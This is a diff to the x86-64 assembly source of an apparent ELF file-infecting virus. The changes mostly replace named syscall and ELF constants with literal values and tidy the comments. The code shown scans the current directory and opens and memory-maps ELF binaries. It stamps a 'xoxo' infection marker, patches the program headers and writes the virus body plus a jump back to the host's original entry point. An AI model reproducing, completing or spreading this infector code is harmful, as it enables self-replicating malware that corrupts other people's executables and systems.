@@ -339,9 +339,9 @@ SYS_FSTAT 		equ 0x5
 SYS_LSEEK 		equ 0x8
 SYS_MMAP 		equ 0x9
 SYS_MUNMAP		equ 0xB
-SYS_PREAD64 	equ 0x11
-SYS_PWRITE64 	equ 0x12
-SYS_EXIT		equ 0x3c
+;SYS_PREAD64 	equ 0x11
+;SYS_PWRITE64 	equ 0x12
+;SYS_EXIT		equ 0x3c
 SYS_FTRUNCATE	equ 0x4d
 SYS_GETDENTS64	equ 0x4e
 SYS_CREAT		equ 0x55
@@ -447,9 +447,9 @@ fd:	dq 0
 STDOUT			equ 0x1
 
 ;open() syscall parameter reference 
-OPEN_RDWR		equ 0x2
-O_WRONLY		equ 0x1
-O_RDONLY		equ 0x0
+;OPEN_RDWR		equ 0x2
+;O_WRONLY		equ 0x1
+;O_RDONLY		equ 0x0
 
 
 ;S_IFREG    	dq 0x0100000   ;regular file
@@ -462,9 +462,9 @@ O_RDONLY		equ 0x0
 ;;see: https://stackoverflow.com/questions/40163270/what-is-s-isreg-and-what-does-it-do#:~:text=S_ISREG()%20is%20a%20macro,stat)%20is%20a%20regular%20file
 
 
-PROT_READ		equ 0x1
-PROT_WRITE		equ 0x2
-MAP_PRIVATE		equ 0x2
+;PROT_READ		equ 0x1
+;PROT_WRITE		equ 0x2
+;MAP_PRIVATE		equ 0x2
 
 ;ELF header vals
 ;ELFCLASS64 	equ 0x2
@@ -476,9 +476,9 @@ MAP_PRIVATE		equ 0x2
 ;DT_REG 			equ 0x8
 
 ;PHDR vals
-PT_LOAD 	equ 0x1
-PFLAGS_RX	equ 0x5
-PFLAGS_RW	equ 0x6
+;PT_LOAD 	equ 0x1
+;PFLAGS_RX	equ 0x5
+;PFLAGS_RW	equ 0x6
 
 MAX_RDENT_BUF_SIZE equ 0x800
 
@@ -498,17 +498,18 @@ vxstart:
 _getdirents:
 ;****************************************************************************************
 ; open - syscall 0x2
-;;open(filename, flags, mode);
-;;rdi == filename
-;;rsi == flags
-;rdx == mode
-;; returns: fd (in rax, obv)
+;;	open(filename, flags, mode);
+;;	rdi == filename
+;;	rsi == flags
+;;	rdx == mode
+;; 	returns: fd (in rax, obv)
 ;****************************************************************************************
 	pop rdi
 	xor rsi, rsi 		;no flags
 	add rsi, 0x02000000
-	mov rdx, O_RDONLY	;open read-only
-	mov rax, SYS_OPEN
+	;mov rdx, O_RDONLY	;open read-only
+	mov rdx, 0x0		;open read-only
+	mov rax, 0x2		;SYS_OPEN ==0x2
 	syscall
 	
 	mov r9, rax						;fd into r9
@@ -521,10 +522,11 @@ get_cwd:
 ;****************************************************************************************
 ; getdents64 - syscall 0x4e
 ;; getdents(unsigned int fd, struct linuxdirent *dirent, unsigned int count);
-;;rdi == fd
-;;rsi == *dirent
-;rdx == count
-;returns # entries in rax
+;;	rdi == fd
+;;	rsi == *dirent
+;;	rdx == count
+;;	returns # entries in rax
+;
 ;[r14 v+ 600 +dirent] holds the pointer to the first dirent struct
 ;so we can iterate through all dirent entries using the size field in this dirent struc
 ;as an offset for successive jumps in address space	
@@ -608,7 +610,8 @@ check_file:
 		lea r12, [rcx + r14 + 618]
 		mov [r14 + 160], r12
 		lea rdi, [rcx + r14 + 618]	;linuxdirent entry filename (linuxdirent.d_nameq) in rdi
-		mov rsi, OPEN_RDWR 					;flags - read/write in rsi
+		;mov rsi, OPEN_RDWR 				;flags - read/write in rsi
+		mov rsi, 0x2 						;flags - read/write in rsi
 		xor rdx, rdx						;mode - 0
 		mov rax, SYS_OPEN
 		syscall
@@ -671,7 +674,8 @@ check_file:
 		xor rdi, rdi			;set RDI to NULL
 		mov rsi, [r14 + 48] 	;filestat.st_size
 		mov rdx, 0x3 			; (PROT_READ | PROT_WRITE)
-		mov r10, MAP_PRIVATE	;fd is already in r8 so we don't need to set that reg again
+		;mov r10, MAP_PRIVATE	;fd is already in r8 so we don't need to set that reg again
+		mov r10, 0x2			;fd is already in r8 so we don't need to set that reg again
 		xor r9, r9				;offset of 0 within file == start of file, obv	
 		mov rax, SYS_MMAP
 		syscall
@@ -714,7 +718,6 @@ check_file:
 ;ELFCLASS64 		equ 0x2
 ;****************************************************************************************
 	check_elf_header_64bit:
-		;cmp byte [rax + 4], ELFCLASS64
 		cmp byte [rax + 4], 0x2
 		jne checknext
 
@@ -860,15 +863,6 @@ infect:
 
 	mov dword [r13 + 9], 0x786f786f		;infection marker string "xoxo" in elf_ehdr.e_padding
 	
-	;mov rdx, checkphdrstartlen
-	;lea rsi, checkphdrstart
-	;mov rdi, STDOUT
-	;mov rax, SYS_WRITE
-	;syscall
-
-;	
-; save original host file entry point for jmp in vx code
-;
 ;****************************************************************************************
 ;	Update program headers of infected ELF
 ;
@@ -880,6 +874,7 @@ infect:
 ;	r13 contains address of mmap'ed file
 ;	r12 contains *offset* within mmap'ed file to PHdr
 ;	we need to increment r12 on each iteration (where # of iterations == elf_ehdr.e_phnum)
+;	also need to save original host file entry point for jmp in vx code
 ;
 ; r14 + elf_ehdr.e_phoff + 0	struc elf_phdr
 ; r14 + elf_ehdr.e_phoff + 0		.p_type			resd 1		;  uint32_t   
@@ -892,19 +887,26 @@ infect:
 ; r14 + elf_ehdr.e_phoff + 48		.p_align		resq 1		;  uint64_t   
 ; r14 + elf_ehdr.e_phoff + 56	endstruc
 ;
+;
+;PT_LOAD 	equ 0x1
+;PFLAGS_RX	equ 0x5
+;PFLAGS_RW	equ 0x6
 ;****************************************************************************************
 	xor rcx, rcx
 	xor r11, r11
-	mov word cx, [r13 + 56]					;elf_ehdr.e_phnum
+	mov word cx, [r13 + 56]									;elf_ehdr.e_phnum
 	check_phdrs:
 		.phdr_loop:
 			push rcx
-			cmp word [r13 + r12], PT_LOAD		;elf_phdr.p_type offset	
+			;cmp word [r13 + r12], PT_LOAD					;elf_phdr.p_type offset	
+			cmp word [r13 + r12], 0x1						;elf_phdr.p_type offset	
 			jne .mod_subsequent_phdr
 			.mod_curr_header:
-				cmp dword [r13 + r12 + 4], PFLAGS_RX		;elf_phdr.p_flags offset
+				;cmp dword [r13 + r12 + 4], PFLAGS_RX		;elf_phdr.p_flags offset
+				cmp dword [r13 + r12 + 4], 0x5				;elf_phdr.p_flags offset
 				je .mod_phdr_text_segment			
-				cmp dword [r13 + r12 + 4], PFLAGS_RW		;elf_phdr.p_flags offset
+				;cmp dword [r13 + r12 + 4], PFLAGS_RW		;elf_phdr.p_flags offset
+				cmp dword [r13 + r12 + 4], 0x6				;elf_phdr.p_flags offset
 				je .mod_phdr_data_segment			
 				jne .mod_other_ptload_phdr
 				.mod_phdr_text_segment:			
@@ -1094,7 +1096,7 @@ frankenstein_elf:
 		mov rdx, vlen
 		lea rsi, [rax + _start]
 		mov r10d, dword [vxoffset]
-		mov rax, SYS_PWRITE64
+		mov rax, 0x12						;SYS_PWRITE64 	equ 0x12
 		syscall
 
 	.write_jmp_to_oep:
@@ -1105,7 +1107,8 @@ frankenstein_elf:
 		lea rsi, [r14+ 150]
 		mov r10d, dword [vxoffset]
 		add r10d, dword vlen				;file offset adjusted to vxoffset+vlen
-		mov rax, SYS_PWRITE64
+		;mov rax, SYS_PWRITE64
+		mov rax, 0x12						;SYS_PWRITE64 	equ 0x12
 		syscall
 		
 	
@@ -1139,7 +1142,8 @@ frankenstein_elf:
 		add rsi, qword [intermediary_ptload_segment_offset]	;adjust rsi address to point to PT_LOAD segment 
 															;following .text segment in mmap'd original host file
 		mov r10d, dword [vx_padding_size]
-		mov rax, SYS_PWRITE64
+		;mov rax, SYS_PWRITE64
+		mov rax, 0x12						;SYS_PWRITE64 	equ 0x12
 		syscall
 
 	.write_patched_shdrs_totemp:
@@ -1148,7 +1152,8 @@ frankenstein_elf:
 		lea rsi, [r13]
 		add rsi, qword [oshoff]
 		mov r10d, dword [vxshoff]
-		mov rax, SYS_PWRITE64
+		;mov rax, SYS_PWRITE64
+		mov rax, 0x12						;SYS_PWRITE64 	equ 0x12
 		syscall
 
 	.munmap_file_work_area:
@@ -1172,10 +1177,11 @@ _restore:
 	add rsp, 0x1000
 	mov rsp, rbp
 	pop rbp
-	
+
+
 vlen equ $-_start
 _end:
 	xor rdi, rdi
-	mov rax, 0x3c 				;exit() syscall on x64
+	mov rax, 0x3c 				;exit() syscall on x64: SYS_EXIT equ 0x3c
 	syscall	
 
